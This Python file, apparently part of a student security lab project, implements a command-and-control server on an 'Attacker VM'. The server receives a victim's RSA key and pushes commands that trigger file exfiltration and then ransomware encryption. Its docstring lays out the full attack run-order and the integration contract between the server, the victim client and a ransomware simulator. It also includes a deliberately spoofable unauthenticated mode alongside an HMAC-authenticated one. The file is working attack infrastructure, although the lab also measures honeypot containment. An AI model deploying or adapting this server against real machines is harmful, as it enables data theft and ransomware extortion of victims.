"""
attacker/c2_server.py  —  Person 1
Command-and-Control server running on the Attacker VM.

Supports two variants controlled by config.AUTH_MODE:
  False  → Naive          : commands accepted with no verification (spoofable)
  True   → Authenticated  : commands verified with HMAC-SHA256

Command set (plain text, newline-terminated)
--------------------------------------------
    PUSH_KEY:<hex-encoded-rsa-public-key-bytes>
    START_EXFIL
    START_ENCRYPT
    STOP

Log format (JSON-lines → logs/c2.log)  ← SHARED FORMAT — do not change
----------------------------------------------------------------------
    {"ts": "2026-10-09T14:32:01.123Z", "module": "c2", "event": "command_received", "cmd": "START_EXFIL", "peer": "192.168.56.20:54312"}
    {"ts": "2026-10-09T14:32:01.456Z", "module": "c2", "event": "auth_accepted",    "peer": "192.168.56.20:54312"}
    {"ts": "2026-10-09T14:32:01.457Z", "module": "c2", "event": "auth_rejected",    "peer": "192.168.56.20:54312", "message": "STOP"}
    {"ts": "2026-10-09T14:32:05.789Z", "module": "c2", "event": "start_encrypt_triggered"}

Fields present on every record: ts (ISO-8601 with ms + Z), module (always "c2"),
event (free string). Additional fields follow naturally. forensic_report.py
(Person 3) reads this log directly.

────────────────────────────────────────────────────────────────────────
  START_ENCRYPT Trigger Contract  (FOR PERSON 3 — read before building simulator)
────────────────────────────────────────────────────────────────────────

  Agreed mechanism ("push from c2_client" model):
  ------------------------------------------------
  The server sends the string "START_ENCRYPT\n" over the existing C2 socket
  (config.C2_PORT = 9001) to the already-connected victim. The victim's
  c2_client.py receives this string, matches it in its message loop, and calls
  _on_start_encrypt() which spawns ransomware/simulator.py as a subprocess.

  Why this model:
  - No extra port required (SIMULATOR_PORT option was considered but rejected
    as it complicates firewall rules and startup ordering).
  - The C2 connection is already established before START_ENCRYPT is sent,
    so there is no race condition on the listening side.
  - simulator.py does NOT open its own socket; it just reads config.py and
    starts encrypting when launched by c2_client.py.

  What Person 3 must implement in ransomware/simulator.py:
  ----------------------------------------------------------
  simulator.py is launched as a *subprocess* by victim/c2_client.py via:
      subprocess.Popen([sys.executable, str(simulator_script)])
  It should NOT try to open its own socket or listen for commands.
  On startup it reads config.TEST_DATA_DIR and begins traversal immediately.
  If Person 3 wants a «wait for signal» mode instead, add a --wait flag and
  post the change in the group chat so c2_client.py can be updated to pass it.

  Demo run-order for integration:
  --------------------------------
  1. Start c2_server.py on Attacker VM   (AUTH_MODE=True for the clean demo)
  2. Start c2_client.py on Victim VM     (connects back, sends PUSH_KEY)
  3. Operator types or scripts: send START_EXFIL command from server
  4. Server sends "START_EXFIL\n" → c2_client dispatches transfer_sender.py
  5. Exfiltration completes; operator sends START_ENCRYPT from server
  6. Server sends "START_ENCRYPT\n" → c2_client spawns simulator.py
  7. Honeypot fires → containment kills simulator.py PID
────────────────────────────────────────────────────────────────────────

Spoofing demo: see attacker/c2_spoof_demo.py  (FR-8.3)
Usage: python3 attacker/c2_server.py

Dependencies: config.py in project root (sys.path adjusted below)
"""

import sys
import os
import socket
import hmac
import hashlib
import json
import logging
from datetime import datetime, timezone
from pathlib import Path

# ── Make config.py importable regardless of working directory ─────────────────
_ROOT = Path(__file__).resolve().parent.parent
if str(_ROOT) not in sys.path:
    sys.path.insert(0, str(_ROOT))

import config  # noqa: E402


# ──────────────────────────────────────────────────────────────────────────────
# Logging (JSON-lines — shared format agreed across all modules)
# ──────────────────────────────────────────────────────────────────────────────

def _setup_logger(log_dir: str) -> logging.Logger:
    Path(log_dir).mkdir(parents=True, exist_ok=True)
    log_path = Path(log_dir) / "c2.log"
    logger = logging.getLogger("c2_server")
    logger.setLevel(logging.DEBUG)
    if not logger.handlers:
        fh = logging.FileHandler(log_path)
        fh.setFormatter(logging.Formatter("%(message)s"))
        logger.addHandler(fh)
        sh = logging.StreamHandler(sys.stdout)
        sh.setFormatter(logging.Formatter("[c2_server] %(message)s"))
        logger.addHandler(sh)
    return logger


def _log(logger: logging.Logger, event: str, **extra) -> None:
    record = {
        "ts": datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z",
        "module": "c2",
        "event": event,
        **extra,
    }
    logger.info(json.dumps(record))


# ──────────────────────────────────────────────────────────────────────────────
# HMAC helpers
# ──────────────────────────────────────────────────────────────────────────────

_HMAC_SEP = b"|SIG|"  # separates command from its HMAC tag in authenticated mode


def _sign_command(raw_cmd: bytes) -> bytes:
    """Append HMAC-SHA256 tag to *raw_cmd*, producing: <raw_cmd>|SIG|<hex_tag>"""
    tag = hmac.new(config.HMAC_SECRET, raw_cmd, hashlib.sha256).hexdigest().encode()
    return raw_cmd + _HMAC_SEP + tag


def _verify_and_strip(message: bytes) -> tuple[bytes, bool]:
    """
    Split <raw_cmd>|SIG|<hex_tag> and verify the HMAC.

    Returns
    -------
    (raw_cmd, valid)  — valid=False means the message was tampered/unsigned.
    """
    if _HMAC_SEP not in message:
        return message, False
    raw_cmd, _, received_tag = message.partition(_HMAC_SEP)
    expected_tag = hmac.new(config.HMAC_SECRET, raw_cmd, hashlib.sha256).hexdigest().encode()
    valid = hmac.compare_digest(expected_tag, received_tag)
    return raw_cmd, valid


# ──────────────────────────────────────────────────────────────────────────────
# Command handlers
# ──────────────────────────────────────────────────────────────────────────────

# A small registry: cmd_name → handler(args_str, conn, logger)
_HANDLERS: dict = {}


def _handler(name: str):
    def decorator(fn):
        _HANDLERS[name] = fn
        return fn
    return decorator


@_handler("PUSH_KEY")
def _handle_push_key(args: str, conn: socket.socket, logger: logging.Logger) -> None:
    """Receive the hex-encoded RSA public key bytes from the victim and save to disk."""
    try:
        key_bytes = bytes.fromhex(args.strip())
    except ValueError:
        _log(logger, "push_key_error", reason="hex decode failed")
        conn.sendall(b"ERR: invalid key encoding\n")
        return

    Path(config.RSA_PUB_KEY_PATH).parent.mkdir(parents=True, exist_ok=True)
    with open(config.RSA_PUB_KEY_PATH, "wb") as fh:
        fh.write(key_bytes)

    _log(logger, "push_key_received", key_path=config.RSA_PUB_KEY_PATH)
    conn.sendall(b"ACK: PUSH_KEY\n")


@_handler("START_EXFIL")
def _handle_start_exfil(_args: str, conn: socket.socket, logger: logging.Logger) -> None:
    """Signal that the attacker is ready to receive exfiltrated files."""
    _log(logger, "start_exfil_triggered")
    conn.sendall(b"ACK: START_EXFIL\n")


@_handler("START_ENCRYPT")
def _handle_start_encrypt(_args: str, conn: socket.socket, logger: logging.Logger) -> None:
    """
    Signal the victim to begin local ransomware encryption.

    The server sends the literal string "START_ENCRYPT\n" over the existing
    C2 socket. victim/c2_client.py receives it, matches in its message loop,
    and spawns ransomware/simulator.py as a subprocess.
    See the 'START_ENCRYPT Trigger Contract' in this module's docstring.
    """
    _log(logger, "start_encrypt_triggered")
    # Push the command DOWN to the victim over the existing C2 connection
    conn.sendall(b"START_ENCRYPT\n")


@_handler("STOP")
def _handle_stop(_args: str, conn: socket.socket, logger: logging.Logger) -> None:
    _log(logger, "stop_received")
    conn.sendall(b"ACK: STOP\n")


# ──────────────────────────────────────────────────────────────────────────────
# Core connection handler
# ──────────────────────────────────────────────────────────────────────────────

def _handle_connection(
    conn: socket.socket,
    addr: tuple,
    auth_mode: bool,
    logger: logging.Logger,
) -> None:
    peer = f"{addr[0]}:{addr[1]}"
    _log(logger, "connection_accepted", peer=peer, auth_mode=auth_mode)

    try:
        with conn:
            conn.sendall(
                b"READY|AUTH\n" if auth_mode else b"READY|NOAUTH\n"
            )

            buf = b""
            while True:
                chunk = conn.recv(4096)
                if not chunk:
                    break
                buf += chunk

                while b"\n" in buf:
                    line, buf = buf.split(b"\n", 1)
                    if not line:
                        continue
                    _process_message(line, conn, auth_mode, logger, peer)

    except Exception as exc:
        _log(logger, "connection_error", peer=peer, error=str(exc))
    finally:
        _log(logger, "connection_closed", peer=peer)


def _process_message(
    raw_message: bytes,
    conn: socket.socket,
    auth_mode: bool,
    logger: logging.Logger,
    peer: str,
) -> None:
    if auth_mode:
        raw_cmd, valid = _verify_and_strip(raw_message)
        if not valid:
            _log(logger, "auth_rejected", peer=peer, message=raw_message[:120].decode(errors="replace"))
            conn.sendall(b"ERR: authentication failed\n")
            return
        _log(logger, "auth_accepted", peer=peer)
    else:
        raw_cmd = raw_message

    # Parse command name and optional arguments
    decoded = raw_cmd.decode(errors="replace").strip()
    if ":" in decoded:
        cmd_name, _, args = decoded.partition(":")
    else:
        cmd_name, args = decoded, ""

    cmd_name = cmd_name.strip().upper()
    _log(logger, "command_received", cmd=cmd_name, peer=peer, auth=auth_mode)

    handler = _HANDLERS.get(cmd_name)
    if handler:
        handler(args, conn, logger)
    else:
        _log(logger, "unknown_command", cmd=cmd_name, peer=peer)
        conn.sendall(f"ERR: unknown command '{cmd_name}'\n".encode())


# ──────────────────────────────────────────────────────────────────────────────
# Server entry point
# ──────────────────────────────────────────────────────────────────────────────

def run_server(
    host: str = config.ATTACKER_IP,
    port: int = config.C2_PORT,
    auth_mode: bool = config.AUTH_MODE,
    log_dir: str = config.LOG_DIR,
) -> None:
    """
    Start the C2 server and block, handling one connection at a time.

    Parameters
    ----------
    host      : str   — IP to bind (default: config.ATTACKER_IP)
    port      : int   — Port to listen on (default: config.C2_PORT)
    auth_mode : bool  — True = HMAC-authenticated, False = naive/unauthenticated
    log_dir   : str   — directory for c2.log
    """
    logger = _setup_logger(log_dir)
    variant = "AUTHENTICATED (HMAC-SHA256)" if auth_mode else "NAIVE (unauthenticated)"
    _log(logger, "server_starting", host=host, port=port, variant=variant)
    print(f"[c2_server] Binding {host}:{port}  [{variant}]")

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as srv:
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((host, port))
        srv.listen(5)
        _log(logger, "server_listening", host=host, port=port)
        print(f"[c2_server] Listening — waiting for victim to connect …")

        while True:
            try:
                conn, addr = srv.accept()
                # Single-threaded: handle one connection, then loop to accept next.
                # For the lab demo this is sufficient; extend with threading if needed.
                _handle_connection(conn, addr, auth_mode, logger)
            except KeyboardInterrupt:
                _log(logger, "server_shutdown", reason="KeyboardInterrupt")
                print("\n[c2_server] Shutting down.")
                break


if __name__ == "__main__":
    run_server()
